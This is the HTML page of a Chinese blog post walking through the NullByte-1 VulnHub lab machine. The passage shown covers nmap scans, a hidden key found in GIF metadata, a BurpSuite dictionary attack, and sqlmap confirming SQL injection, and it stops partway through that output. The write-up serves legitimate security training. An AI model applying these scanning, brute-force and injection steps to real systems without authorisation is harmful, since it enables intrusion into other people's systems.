@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="名称名称：NullByte：1发布日期：2015年8月1日 下载 Download: http:&#x2F;&#x2F;ly0n.me&#x2F;nullbyte&#x2F;NullByte.ova.zip Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;nullbyte&#x2F;NullByte.ova.zip Download (Torrent): https:&#x2F;&#x2F;download.vulnh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[NullByte-1]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/01/02/NullByte-1/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="名称名称：NullByte：1发布日期：2015年8月1日 下载 Download: http:&#x2F;&#x2F;ly0n.me&#x2F;nullbyte&#x2F;NullByte.ova.zip Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;nullbyte&#x2F;NullByte.ova.zip Download (Torrent): https:&#x2F;&#x2F;download.vulnh">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub121.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub122.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub123.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub124.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub125.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2020-01-02T01:53:36.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:56:24.153Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub121.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/01/02/NullByte-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/01/02/NullByte-1/","path":"2020/01/02/NullByte-1/","title":"vulnhub靶机渗透[NullByte-1]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[NullByte-1] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8D%E7%A7%B0"><span class="nav-number">1.</span> <span class="nav-text">名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">5.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%831"><span class="nav-number">6.</span> <span class="nav-text">提权1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%832"><span class="nav-number">7.</span> <span class="nav-text">提权2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%833"><span class="nav-number">8.</span> <span class="nav-text">提权3</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/01/02/NullByte-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[NullByte-1] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[NullByte-1]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-01-02 09:53:36" itemprop="dateCreated datePublished" datetime="2020-01-02T09:53:36+08:00">2020-01-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:56:24" itemprop="dateModified" datetime="2020-08-17T00:56:24+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：NullByte：1<br>发布日期：2015年8月1日</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
+<li>Download: <span class="exturl" data-url="aHR0cDovL2x5MG4ubWUvbnVsbGJ5dGUvTnVsbEJ5dGUub3ZhLnppcA==">http://ly0n.me/nullbyte/NullByte.ova.zip<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9udWxsYnl0ZS9OdWxsQnl0ZS5vdmEuemlw">https://download.vulnhub.com/nullbyte/NullByte.ova.zip<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9udWxsYnl0ZS9OdWxsQnl0ZS5vdmEuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/nullbyte/NullByte.ova.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<span id="more"></span>
+
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>代号：NB0x01<br>下载：ly0n.me&#x2F;nullbyte&#x2F;NullByte.ova.zip<br>目标：转到&#x2F;root&#x2F;proof.txt并按照说明进行操作。<br>级别：基础到中级。<br>说明：Boot2root，Box将从dhcp获取IP，可与virtualbox＆vmware正常工作。<br>提示：使用您的横向思考技巧，也许您需要编写一些代码。</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.106</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 08:00:27:FE:89:AF (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -sV -Pn -v 192.168.56.106</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)</span><br><span class="line">50480/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -Pn -T5 -v -A --script=vuln -p 80,111,777,50480 192.168.56.106</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /phpmyadmin/: phpMyAdmin</span><br><span class="line">|_  /uploads/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">111/tcp   open  rpcbind 2-4 (RPC #100000)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| rpcinfo: </span></span><br><span class="line"><span class="string">|   program version    port/proto  service</span></span><br><span class="line"><span class="string">|   100000  2,3,4        111/tcp   rpcbind</span></span><br><span class="line"><span class="string">|   100000  2,3,4        111/udp   rpcbind</span></span><br><span class="line"><span class="string">|   100000  3,4          111/tcp6  rpcbind</span></span><br><span class="line"><span class="string">|   100000  3,4          111/udp6  rpcbind</span></span><br><span class="line"><span class="string">|   100024  1          44704/tcp6  status</span></span><br><span class="line"><span class="string">|   100024  1          47970/udp6  status</span></span><br><span class="line"><span class="string">|   100024  1          50480/tcp   status</span></span><br><span class="line"><span class="string">|_  100024  1          54179/udp   status</span></span><br><span class="line"><span class="string">777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">50480/tcp open  status  1 (RPC #100024)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到ssh端口开在777</p>
+<p>页面上有图像。 在页面源上没有找到任何内容。 但是图像中可能隐藏了一些东西，因此，使用exiftool读取图像，因此下载该图像。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># exiftool main.gif </span></span><br><span class="line">ExifTool Version Number         : 11.80</span><br><span class="line">File Name                       : main.gif</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 16 kB</span><br><span class="line">File Modification Date/Time     : 2020:01:01 21:14:10-05:00</span><br><span class="line">File Access Date/Time           : 2020:01:01 21:14:10-05:00</span><br><span class="line">File Inode Change Date/Time     : 2020:01:01 21:14:10-05:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : GIF</span><br><span class="line">File Type Extension             : gif</span><br><span class="line">MIME Type                       : image/gif</span><br><span class="line">GIF Version                     : 89a</span><br><span class="line">Image Width                     : 235</span><br><span class="line">Image Height                    : 302</span><br><span class="line">Has Color Map                   : No</span><br><span class="line">Color Resolution Depth          : 8</span><br><span class="line">Bits Per Pixel                  : 1</span><br><span class="line">Background Color                : 0</span><br><span class="line">Comment                         : P-): kzMb5nVYJw</span><br><span class="line">Image Size                      : 235x302</span><br><span class="line">Megapixels                      : 0.071</span><br></pre></td></tr></table></figure>
+
+<p>发现Comment处有一串字符kzMb5nVYJw，可能是密码或者目录</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub121.jpg"></p>
+<p>假设是正确的，但这是一个key。 不知道密钥是什么，因此，使用字典攻击通过BurpSuite和rockyou.txt查找到密钥elite.</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub122.jpg"></p>
+<p>输入密匙，跳转到下面的页面，要求输入username，猜测username处可能存在注入</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub123.jpg"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap.py -r sqlmap.txt</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.3.12.1<span class="comment">#dev&#125;</span></span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 10:41:51 /2020-01-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:41:51] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing if GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is dynamic</span></span><br><span class="line"><span class="string">[10:41:51] [WARNING] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; does not appear to be dynamic</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] heuristic (basic) test shows that GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; might be injectable (possible DBMS: &#x27;</span>MySQL<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing for SQL injection on GET parameter &#x27;</span>usrtosearch<span class="string">&#x27;</span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;</span>MySQL<span class="string">&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;</span>MySQL<span class="string">&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing &#x27;</span>Boolean-based blind - Parameter replace (original value)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause (MySQL comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:52] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[10:41:52] [INFO] testing &#x27;</span>OR boolean-based blind - WHERE or HAVING clause (MySQL comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:52] [INFO] testing &#x27;</span>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; appears to be &#x27;</span>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)<span class="string">&#x27; injectable (with --not-string=&quot;ID&quot;)</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is &#x27;</span>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries<span class="string">&#x27;</span></span><br><span class="line"><span 